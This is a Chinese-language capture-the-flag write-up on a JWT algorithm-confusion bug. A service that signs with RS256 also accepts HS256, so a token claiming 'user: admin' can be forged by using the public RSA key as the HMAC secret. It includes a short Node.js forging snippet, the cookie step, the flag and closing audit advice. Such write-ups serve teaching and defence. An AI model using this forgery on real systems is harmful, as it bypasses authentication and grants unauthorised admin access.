# i am confusion

## 题目简述

服务用 RSA 私钥签发登录 JWT，但验证时同时接受 `HS256` 与 `RS256`，并把 RSA 公钥作为验证密钥。这使攻击者能把公开可得的 RSA 公钥误当作 HMAC 密钥，伪造 `user: admin` 的 HS256 token，属于 JWT 算法混淆。

管理员页只检查解码后 `decoded_jwt['user'] == 'admin'`，没有额外的服务端角色查询。

## 解题过程

从挑战 HTTPS 服务取得证书链并导出其中的 RSA 公钥。关键不是私钥泄漏，而是得到验证端同样使用的公钥字节。将其转换为 RSA PEM 格式后，以该公钥文本作为 HMAC-SHA256 的密钥签发 token：

```js
const jwt = require('jsonwebtoken');
const fs = require('fs');

const publicKey = fs.readFileSync('pubkey.rsa');
const token = jwt.sign(
  { user: 'admin' },
  publicKey,
  { algorithm: 'HS256' }
);
```

把 `token` 写入名为 `auth` 的 Cookie 后访问 `/admin.html`。服务端会因允许 `HS256` 而使用同一份公钥文本进行 HMAC 校验，签名通过后读取到 `user: admin`，从而返回管理员页面。页面中的 flag 为：

```text
DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}
```

## 方法总结

JWT 验证必须由服务端固定算法，不能把对称算法与非对称算法同时放进允许列表，更不能复用 RSA 公钥作为 HMAC 密钥。审计时要把“签发使用的算法”“验证允许的算法”“传入验证器的密钥类型”三项放在一起检查；单独看到 RS256 往往会掩盖算法混淆风险。
